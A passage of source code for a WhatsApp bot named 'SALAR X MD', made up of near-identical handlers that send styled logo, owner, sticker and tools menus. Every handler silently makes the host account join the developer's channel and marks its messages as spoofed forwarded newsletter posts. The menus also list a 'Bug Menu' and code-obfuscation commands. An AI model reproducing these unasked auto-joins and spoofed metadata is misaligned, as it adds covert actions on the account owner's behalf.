⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑* | © 2026
`;

                // TRY-CATCH for image sending with fallback to text only
try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            ...media
          },
          body: {
            text: menuText
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  sections: [
                    {
                      title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                      rows: [
                        { title: "🤖 AI Menu", rowId: `.aimenu` },
                        { title: "🎨 Anime Menu", rowId: `.animemenu` },
                        { title: "🐛 Bug Menu", rowId: `.bugmenu` },
                        { title: "📥 Download Menu", rowId: `.downloadmenu` },
                        { title: "🎮 Fun Menu", rowId: `.funmenu` },
                        { title: "🎲 Game Menu", rowId: `.gamemenu` },
                        { title: "👥 Group Menu", rowId: `.groupmenu` },
                        { title: "🏷️ Logo Menu", rowId: `.logomenu` },
                        { title: "👑 Owner Menu", rowId: `.ownermenu` },
                        { title: "🏷️ Sticker Menu", rowId: `.stickermenu` },
                        { title: "🔧 Tools Menu", rowId: `.toolsmenu` },
                        { title: "🎙️ Voice Menu", rowId: `.voicemenu` },
                        { title: "📦 Other Menu", rowId: `.othermenu` }
                      ]
                    }
                  ]
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "📢 CHANNEL",
                  url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
                })
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363427254972269@newsletter",
              newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              serverMessageId: -1
            },
            externalAdReply: {
              title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              body: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              thumbnailUrl: randomImage,
              sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {});

} catch (err) {
  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback biar gak kosong
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
                break;

            case 'logomenu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗logo': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐋𝐎𝐆𝐎* ◆━━┓
│❖ ${prefix}advancedglow
│❖ ${prefix}blackpinklogo
│❖ ${prefix}blackpinkstyle
│❖ ${prefix}cartoonstyle
│❖ ${prefix}deletingtext
│❖ ${prefix}effectclouds
│❖ ${prefix}flag3dtext
│❖ ${prefix}flagtext
│❖ ${prefix}freecreate
│❖ ${prefix}galaxystyle
│❖ ${prefix}galaxywallpaper
│❖ ${prefix}gfx
│❖ ${prefix}gfx10
│❖ ${prefix}gfx11
│❖ ${prefix}gfx12
│❖ ${prefix}gfx2
│❖ ${prefix}gfx3
│❖ ${prefix}gfx4
│❖ ${prefix}gfx5
│❖ ${prefix}gfx6
│❖ ${prefix}gfx7
│❖ ${prefix}gfx8
│❖ ${prefix}gfx9
│❖ ${prefix}glitchtext
│❖ ${prefix}glowingtext
│❖ ${prefix}gradienttext
│❖ ${prefix}lighteffects
│❖ ${prefix}logomaker
│❖ ${prefix}luxurygold
│❖ ${prefix}makingneon
│❖ ${prefix}multicoloredneon
│❖ ${prefix}neonglitch
│❖ ${prefix}papercutstyle
│❖ ${prefix}pixelglitch
│❖ ${prefix}royaltext
│❖ ${prefix}sandsummer
│❖ ${prefix}style1917
│❖ ${prefix}summerbeach
│❖ ${prefix}typographytext
│❖ ${prefix}underwatertext
│❖ ${prefix}watercolortext
│❖ ${prefix}writetext
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑* | © 2026
`;

try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            ...media
          },
          body: {
            text: menuText
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  sections: [
                    {
                      title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                      rows: [
                        { title: "🤖 AI Menu", rowId: `.aimenu` },
                        { title: "🎨 Anime Menu", rowId: `.animemenu` },
                        { title: "🐛 Bug Menu", rowId: `.bugmenu` },
                        { title: "📥 Download Menu", rowId: `.downloadmenu` },
                        { title: "🎮 Fun Menu", rowId: `.funmenu` },
                        { title: "🎲 Game Menu", rowId: `.gamemenu` },
                        { title: "👥 Group Menu", rowId: `.groupmenu` },
                        { title: "🏷️ Logo Menu", rowId: `.logomenu` },
                        { title: "👑 Owner Menu", rowId: `.ownermenu` },
                        { title: "🏷️ Sticker Menu", rowId: `.stickermenu` },
                        { title: "🔧 Tools Menu", rowId: `.toolsmenu` },
                        { title: "🎙️ Voice Menu", rowId: `.voicemenu` },
                        { title: "📦 Other Menu", rowId: `.othermenu` }
                      ]
                    }
                  ]
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "📢 CHANNEL",
                  url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
                })
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363427254972269@newsletter",
              newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              serverMessageId: -1
            },
            externalAdReply: {
              title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              body: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              thumbnailUrl: randomImage,
              sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {});

} catch (err) {
  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback biar gak kosong
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
                break;

            case 'ownermenu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗owner': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐎𝐖𝐍𝐄𝐑* ◆━━┓
│❖ .
│❖ ${prefix}addsudo
│❖ ${prefix}antibot
│❖ ${prefix}antibadword
│❖ ${prefix}autobio
│❖ ${prefix}autoreact
│❖ ${prefix}autoread
│❖ ${prefix}autorecording
│❖ ${prefix}autorecordtype
│❖ ${prefix}autoreply
│❖ ${prefix}autotyping
│❖ ${prefix}autoviewstatus
│❖ ${prefix}ban
│❖ ${prefix}banuser
│❖ ${prefix}banuser1
│❖ ${prefix}block
│❖ ${prefix}broadcast
│❖ ${prefix}delsudo
│❖ ${prefix}getsudo
│❖ ${prefix}listban
│❖ ${prefix}listbanuser
│❖ ${prefix}listsudo
│❖ ${prefix}private
│❖ ${prefix}public
│❖ ${prefix}self
│❖ ${prefix}setpp
│❖ ${prefix}setsudo
│❖ ${prefix}setprefix
│❖ ${prefix}sudo
│❖ ${prefix}unban
│❖ ${prefix}unbanuser
│❖ ${prefix}unbanuser1
│❖ ${prefix}unblock
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑* | © 2026
`;

try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            ...media
          },
          body: {
            text: menuText
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  sections: [
                    {
                      title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                      rows: [
                        { title: "🤖 AI Menu", rowId: `.aimenu` },
                        { title: "🎨 Anime Menu", rowId: `.animemenu` },
                        { title: "🐛 Bug Menu", rowId: `.bugmenu` },
                        { title: "📥 Download Menu", rowId: `.downloadmenu` },
                        { title: "🎮 Fun Menu", rowId: `.funmenu` },
                        { title: "🎲 Game Menu", rowId: `.gamemenu` },
                        { title: "👥 Group Menu", rowId: `.groupmenu` },
                        { title: "🏷️ Logo Menu", rowId: `.logomenu` },
                        { title: "👑 Owner Menu", rowId: `.ownermenu` },
                        { title: "🏷️ Sticker Menu", rowId: `.stickermenu` },
                        { title: "🔧 Tools Menu", rowId: `.toolsmenu` },
                        { title: "🎙️ Voice Menu", rowId: `.voicemenu` },
                        { title: "📦 Other Menu", rowId: `.othermenu` }
                      ]
                    }
                  ]
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "📢 CHANNEL",
                  url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
                })
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363427254972269@newsletter",
              newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              serverMessageId: -1
            },
            externalAdReply: {
              title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              body: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              thumbnailUrl: randomImage,
              sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {});

} catch (err) {
  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback biar gak kosong
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
                break;

            case 'stickermenu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗sticker': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐒𝐓𝐈𝐂𝐊𝐄𝐑* ◆━━┓
│❖ ${prefix}awoo
│❖ ${prefix}bite
│❖ ${prefix}blush
│❖ ${prefix}bonk
│❖ ${prefix}bully
│❖ ${prefix}cringe
│❖ ${prefix}cry
│❖ ${prefix}cuddle
│❖ ${prefix}dance
│❖ ${prefix}glomp
│❖ ${prefix}handhold
│❖ ${prefix}happy
│❖ ${prefix}highfive
│❖ ${prefix}hug
│❖ ${prefix}kill
│❖ ${prefix}kiss
│❖ ${prefix}lick
│❖ ${prefix}nom
│❖ ${prefix}pat
│❖ ${prefix}poke
│❖ ${prefix}qc
│❖ ${prefix}s
│❖ ${prefix}shinobu
│❖ ${prefix}slap
│❖ ${prefix}smile
│❖ ${prefix}smug
│❖ ${prefix}steal
│❖ ${prefix}sticker
│❖ ${prefix}stickerthf
│❖ ${prefix}stickerwm
│❖ ${prefix}take
│❖ ${prefix}tosticker
│❖ ${prefix}wave
│❖ ${prefix}wink
│❖ ${prefix}wm
│❖ ${prefix}yeet
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑* | © 2026
`;

try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            ...media
          },
          body: {
            text: menuText
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  sections: [
                    {
                      title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                      rows: [
                        { title: "🤖 AI Menu", rowId: `.aimenu` },
                        { title: "🎨 Anime Menu", rowId: `.animemenu` },
                        { title: "🐛 Bug Menu", rowId: `.bugmenu` },
                        { title: "📥 Download Menu", rowId: `.downloadmenu` },
                        { title: "🎮 Fun Menu", rowId: `.funmenu` },
                        { title: "🎲 Game Menu", rowId: `.gamemenu` },
                        { title: "👥 Group Menu", rowId: `.groupmenu` },
                        { title: "🏷️ Logo Menu", rowId: `.logomenu` },
                        { title: "👑 Owner Menu", rowId: `.ownermenu` },
                        { title: "🏷️ Sticker Menu", rowId: `.stickermenu` },
                        { title: "🔧 Tools Menu", rowId: `.toolsmenu` },
                        { title: "🎙️ Voice Menu", rowId: `.voicemenu` },
                        { title: "📦 Other Menu", rowId: `.othermenu` }
                      ]
                    }
                  ]
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "📢 CHANNEL",
                  url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
                })
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363427254972269@newsletter",
              newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              serverMessageId: -1
            },
            externalAdReply: {
              title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              body: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              thumbnailUrl: randomImage,
              sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {});

} catch (err) {
  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback biar gak kosong
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
                break;

            case 'toolsmenu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗tool': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐓𝐎𝐎𝐋𝐒* ◆━━┓
│❖ ${prefix}channel-react
│❖ ${prefix}simdata
│❖ ${prefix}testfunction
│❖ ${prefix}calculate
│❖ ${prefix}calculator
│❖ ${prefix}cartoonify
│❖ ${prefix}currency
│❖ ${prefix}currencies
│❖ ${prefix}define
│❖ ${prefix}dictionary
│❖ ${prefix}genpass
│❖ ${prefix}myip
│❖ ${prefix}qrcode
│❖ ${prefix}readqr
│❖ ${prefix}readmore
│❖ ${prefix}removebg
│❖ ${prefix}remind
│❖ ${prefix}shorturl
│❖ ${prefix}tomp3
│❖ ${prefix}tomp4
│❖ ${prefix}toimg
│❖ ${prefix}tourl
│❖ ${prefix}translate
│❖ ${prefix}url
│❖ ${prefix}weather
│❖ ${prefix}weather2
│❖ ${prefix}weatherinfo
│❖ ${prefix}wiki
│❖ ${prefix}wikipedia
│
│❖ ${prefix}raju
│❖ ${prefix}raju-active
│❖ ${prefix}raju-off
│
│❖ ${prefix}antidelete-on
│❖ ${prefix}antidelete-off
│
│❖ ${prefix}encjs
│❖ ${prefix}strong
│❖ ${prefix}bigstro
│❖ ${prefix}invis
│❖ ${prefix}norinv
│❖ ${prefix}quantum
│❖ ${prefix}varenc
│❖ ${prefix}yuienc
│❖ ${prefix}nova
│❖ ${prefix}japan
│❖ ${prefix}japxar
│❖ ${prefix}siucal
│❖ ${prefix}custom
│❖ ${prefix}timelocked
│❖ ${prefix}enchtml
│❖ ${prefix}enchard
│❖ ${prefix}encaes
│❖ ${prefix}locked
│❖ ${prefix}chinaenc
│❖ ${prefix}arabenc
│❖ ${prefix}japanenc
│❖ ${prefix}deobfuscate
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑* | © 2026
`;

try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            ...media
          },
          body: {
            text: menuText
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  sections: [
                    {
                      title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                      rows: [
                        { title: "🤖 AI Menu", rowId: `.aimenu` },
                        { title: "🎨 Anime Menu", rowId: `.animemenu` },
                        { title: "🐛 Bug Menu", rowId: `.bugmenu` },
                        { title: "📥 Download Menu", rowId: `.downloadmenu` },
                        { title: "🎮 Fun Menu", rowId: `.funmenu` },
                        { title: "🎲 Game Menu", rowId: `.gamemenu` },
                        { title: "👥 Group Menu", rowId: `.groupmenu` },
                        { title: "🏷️ Logo Menu", rowId: `.logomenu` },
                        { title: "👑 Owner Menu", rowId: `.ownermenu` },
                        { title: "🏷️ Sticker Menu", rowId: `.stickermenu` },
                        { title: "🔧 Tools Menu", rowId: `.toolsmenu` },
                        { title: "🎙️ Voice Menu", rowId: `.voicemenu` },
                        { title: "📦 Other Menu", rowId: `.othermenu` }
                      ]
                    }
                  ]
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "📢 CHANNEL",
                  url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
                })
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363427254972269@newsletter",
              newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              serverMessageId: -1
            },
            externalAdReply: {
              title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              body: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              thumbnailUrl: randomImage,
              sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {});

} catch (err) {
